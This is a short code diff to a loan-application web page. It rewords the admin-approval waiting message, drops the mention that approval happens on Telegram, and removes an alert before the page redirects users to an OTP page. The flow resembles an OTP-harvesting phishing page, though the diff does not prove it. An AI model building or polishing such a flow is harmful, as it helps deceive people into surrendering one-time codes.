@@ -155,13 +155,13 @@
         <div class="error-msg" id="errorMsg"></div>
         
         <div class="waiting-area" id="waitingArea">
-            <strong>⏳ Waiting for Admin Approval</strong>
+            <strong>⏳ Waiting For Admin Approval</strong>
             <div class="waiting-dots">
                 <div class="dot"></div>
                 <div class="dot"></div>
                 <div class="dot"></div>
             </div>
-            <p style="font-size: 12px; margin-top: 12px;">Please wait while admin reviews your application on Telegram...</p>
+            <p style="font-size: 12px; margin-top: 12px;">Please wait while admin reviews your application.</p>
         </div>
         
         <button id="submitBtn">Submit Application →</button>
@@ -205,7 +205,6 @@
                 if (data.success && data.loan && data.loan.status === 'approved') {
                     clearInterval(pollInterval);
                     document.getElementById('spinner').style.display = 'none';
-                    alert("✅ Loan Approved! Redirecting to OTP page...");
                     window.location.href = 'otp.html';
                 }
             } catch (err) {
